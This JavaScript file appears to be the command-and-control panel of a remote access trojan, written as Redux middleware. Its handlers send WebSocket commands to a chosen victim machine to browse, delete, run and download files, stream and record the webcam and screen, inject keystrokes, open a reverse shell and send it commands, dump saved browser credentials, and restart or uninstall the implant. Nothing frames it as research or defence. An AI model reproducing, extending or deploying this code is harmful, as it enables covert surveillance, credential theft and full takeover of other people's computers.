import {DELETE, DOWNLOAD, MOVE, RUN} from "@redux/actions/fileManagerActions";
import {addProgressBar} from "@redux/slices/fileManagerSlice";
import {
    SEND_WEBCAM_RECORDS,
    START_RECORDING_WEBCAM,
    START_WEBCAM,
    STOP_RECORDING_WEBCAM,
    STOP_WEBCAM,
    WEBCAM_DEVICES
} from "@redux/actions/webcamManagerActions";
import {SELECT_CLIENT} from "@redux/actions/connectionActions";

import {
    KEY_EXECUTION,
    MONITORS,
    START_SCREEN_STREAMING,
    STOP_SCREEN_STREAMING
} from "@redux/actions/screenManagerActions";
import {REVERSE_SHELL_COMMAND, START_REVERSE_SHELL} from "@redux/actions/reverseShellActions";
import {DUMP_BROWSER} from "@redux/actions/credentialsActions";
import {KEYBOARD_CONTROLLER} from "@redux/actions/keyboardControllerActions";
import {SHOW_MESSAGE_BOX} from "@redux/actions/messsageBoxActions";
import {DISCONNECT, RESTART, SYSTEM_STATE, UNINSTALL} from "@redux/actions/stateActions";


const sendWebSocketMessage = (websocket, message) => {
    try {
        if (websocket) {
            websocket.send(JSON.stringify(message));
            console.log("Message sent:", message);
        }
    } catch (error) {
        console.error("Error sending websocket message:", error);
    }
};


export const handleSelectClient = (websocket, store, action) => {
    const message = {
        ACTION: SELECT_CLIENT,
        client_id: action.payload.client_id,
        set_null: action.payload.set_null
    };
    sendWebSocketMessage(websocket, message);

};

export const handleRequestDisks = (websocket, store, action) => {
    const message = {
        ACTION: 'DISKS',
        sendDirectory: action.payload.sendDirectory,
        client_id: action.payload.client_id
    };
    sendWebSocketMessage(websocket, message);
};

export const handleCopy = (websocket, store, action) => {
    const message = {
        ACTION: 'COPY',
        from_paths: action.payload.from_paths,
        to_paths: action.payload.to_paths,
        client_id: store.getState().client.selectedClient.systemInformation.UUID
    };
    sendWebSocketMessage(websocket, message);
};

export const handleMove = (websocket, store, action) => {
    const message = {
        ACTION: MOVE,
        from_paths: action.payload.from_paths,
        to_path: action.payload.to_paths[0],
        client_id: store.getState().client.selectedClient.systemInformation.UUID
    };
    sendWebSocketMessage(websocket, message);
    console.log(message);
    console.log("Moving !! mac: " + action.payload);
}

export const handleDelete = (websocket, store, action) => {
    const message = {
        ACTION: DELETE,
        from_paths: action.payload,
        client_id: store.getState().client.selectedClient.systemInformation.UUID
    };
    sendWebSocketMessage(websocket, message);
    console.log(message);
    console.log("Delete !! mac: " + action.payload);
}

export const handleRun = (websocket, store, action) => {
    const message = {
        ACTION: RUN,
        from_paths: action.payload,
        client_id: store.getState().client.selectedClient.systemInformation.UUID
    };
    sendWebSocketMessage(websocket, message);
    console.log(message);
    console.log("Delete !! mac: " + action.payload);
}

export const handleRequestDirectory = (websocket, store, action) => {
    const message = {
        ACTION: 'DIRECTORY',
        path: action.payload.path,
        client_id: action.payload.client_id,
        window_id: ""
    };
    sendWebSocketMessage(websocket, message);
    console.log("Sending message to " + action.payload.path);
}

export const fetchChannelId = async (store, category) => {
    try {
        const response = await fetch('http://localhost:3055/create-byte-channel', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                client_id: store.getState().client.selectedClient.systemInformation.UUID,
                category: category
            })
        });
        const jsonResponse = await response.json();
        return jsonResponse || null;
    } catch (error) {
        console.error(error);
        return null;
    }
};

export const handleStartWebcam = async (websocket, store, action) => {
    const response = await fetchChannelId(store, "WEBCAM_STREAMING");
    console.log(response)
    if (response === null) {
        console.error("Failed to retrieve channel ID.");
        return;
    }
    const message = {
        ACTION: START_WEBCAM,
        channel_id: response.channel_id,
        selected_device: action.payload.selected_device,
        is_fragmented: action.payload.isFragmented,
        fps: action.payload.fps,
        client_id: store.getState().client.selectedClient.systemInformation.UUID
    };
    sendWebSocketMessage(websocket, message);
    console.log("Start webcam to " + action.payload);
}

export const handleDownload = async (websocket, store, action) => {
    const response = await fetchChannelId(store, "ZIP_FILE");

    if (response === null) {
        console.error("Failed to retrieve channel ID.");
        return;
    }
    store.dispatch(addProgressBar({channel_id: response}));
    const message = {
        ACTION: DOWNLOAD,
        from_path: action.payload,
        channel_id: response.channel_id,
        client_id: store.getState().client.selectedClient.systemInformation.UUID
    };
    sendWebSocketMessage(websocket, message);
    console.log("Download to " + action.payload);
}

export const handleStopWebcam = (websocket, store, action) => {
    const message = {
        ACTION: STOP_WEBCAM,
        client_id: store.getState().client.selectedClient.systemInformation.UUID
    };
    sendWebSocketMessage(websocket, message);
    console.log("Stop webcam to " + action.payload);
}

export const handleStartRecording = (websocket, store, action) => {
    const message = {
        ACTION: START_RECORDING_WEBCAM,
        client_id: store.getState().client.selectedClient.systemInformation.UUID
    };
    sendWebSocketMessage(websocket, message);
    console.log("Stop webcam to " + action.payload);
}

export const handleStopRecording = (websocket, store, action) => {
    const message = {
        ACTION: STOP_RECORDING_WEBCAM,
        client_id: store.getState().client.selectedClient.systemInformation.UUID
    };
    sendWebSocketMessage(websocket, message);
    console.log("Stop webcam to " + action.payload);
}

export const handleSendWebcamRecords = async (websocket, store, action) => {
    const response = await fetchChannelId(store, "WEBCAM_LOGS");
    if (response === null) {
        console.error("Failed to retrieve channel ID.");
        return;
    }

    const message = {
        ACTION: SEND_WEBCAM_RECORDS,
        channel_id: response.channel_id,
        client_id: store.getState().client.selectedClient.systemInformation.UUID
    };
    sendWebSocketMessage(websocket, message);
    console.log("Send webcam to " + action.payload);
}

export const handleWebcamDevices = async (websocket, store, action) => {
    const message = {
        ACTION: WEBCAM_DEVICES,
        client_id: store.getState().client.selectedClient.systemInformation.UUID
    };
    sendWebSocketMessage(websocket, message);
    console.log("Download to " + action.payload);
}


export const handleStartStreaming = async (websocket, store, action) => {
    const response = await fetchChannelId(store, "SCREEN_STREAMING");
    console.log(response)
    if (response === null) {
        console.error("Failed to retrieve channel ID.");
        return;
    }

    const message = {
        ACTION: START_SCREEN_STREAMING,
        channel_id: response.channel_id,
        monitor_id: action.payload.monitor_id,
        client_id: store.getState().client.selectedClient.systemInformation.UUID
    };
    sendWebSocketMessage(websocket, message);
    console.log("Start streaming to " + action.payload);
}

export const handleStopStreaming = (websocket, store, action) => {
    const message = {
        ACTION: STOP_SCREEN_STREAMING,
        client_id: store.getState().client.selectedClient.systemInformation.UUID
    };
    sendWebSocketMessage(websocket, message);
    console.log("Stop streaming to " + action.payload);
}

export const handleMonitors = (websocket, store, action) => {
    const message = {
        ACTION: MONITORS,
        client_id: store.getState().client.selectedClient.systemInformation.UUID
    };
    sendWebSocketMessage(websocket, message);
    console.log("Requesting monitors to " + action.payload);
}

export const handleKey = (websocket, store, action) => {
    const message = {
        ACTION: KEY_EXECUTION,
        key: JSON.stringify(action.payload),
        client_id: store.getState().client.selectedClient.systemInformation.UUID
    };
    sendWebSocketMessage(websocket, message);
    console.log("Request key execution to " + action.payload);
}

export const handleStartReverseShell = (websocket, store, action) => {
    const message = {
        ACTION: START_REVERSE_SHELL,
        client_id: store.getState().client.selectedClient.systemInformation.UUID
    };
    sendWebSocketMessage(websocket, message);
    console.log("Request start shell execution to " + action.payload);
}

export const handleSendCommandReverseShell = (websocket, store, action) => {
    const message = {
        ACTION: REVERSE_SHELL_COMMAND,
        command: action.payload,
        client_id: store.getState().client.selectedClient.systemInformation.UUID
    };
    sendWebSocketMessage(websocket, message);
    console.log("Request start shell execution to " + action.payload);
}

export const handleDumpBrowser = async (websocket, store, action) => {
    const response = await fetchChannelId(store, "BROWSER_CREDENTIALS");
    if (response === null) {
        console.error("Failed to retrieve channel ID.");
        return;
    }
    const message = {
        ACTION: DUMP_BROWSER,
        channel_id: response.channel_id,
        client_id: store.getState().client.selectedClient.systemInformation.UUID
    };
    sendWebSocketMessage(websocket, message);
    console.log("Request browser execution to " + action.payload);
}


export const handleKeyboardController = async (websocket, store, action) => {
    const message = {
        ACTION: KEYBOARD_CONTROLLER,
        command: action.payload.command,
        client_id: store.getState().client.selectedClient.systemInformation.UUID
    };
    sendWebSocketMessage(websocket, message);
    console.log("Request browser execution to " + action.payload);
}


export const handleMessageBox = async (websocket, store, action) => {
    const message = {
        ACTION: SHOW_MESSAGE_BOX,
        info: action.payload.info,
        client_id: store.getState().client.selectedClient.systemInformation.UUID
    };
    sendWebSocketMessage(websocket, message);
    console.log("Request message box to " + action.payload);
}

export const handleSystemState = async (websocket, store, action) => {
    const message = {
        ACTION: SYSTEM_STATE,
        type: action.payload,
        client_id: store.getState().client.selectedClient.systemInformation.UUID
    };
    sendWebSocketMessage(websocket, message);
    console.log("Request message box to " + action.payload);
}


export const handleDisconnect = async (websocket, store, action) => {
    const message = {
        ACTION: DISCONNECT,
        client_id: store.getState().client.selectedClient.systemInformation.UUID
    };
    sendWebSocketMessage(websocket, message);
    console.log("Request message box to " + action.payload);
}

export const handleRestartConnection = async (websocket, store, action) => {
    const message = {
        ACTION: RESTART,
        client_id: store.getState().client.selectedClient.systemInformation.UUID
    };
    sendWebSocketMessage(websocket, message);
    console.log("Request message box to " + action.payload);
}

export const handleUninstall = async (websocket, store, action) => {
    const message = {
        ACTION: UNINSTALL,
        client_id: store.getState().client.selectedClient.systemInformation.UUID
    };
    sendWebSocketMessage(websocket, message);
    console.log("Request message box to " + action.payload);
}

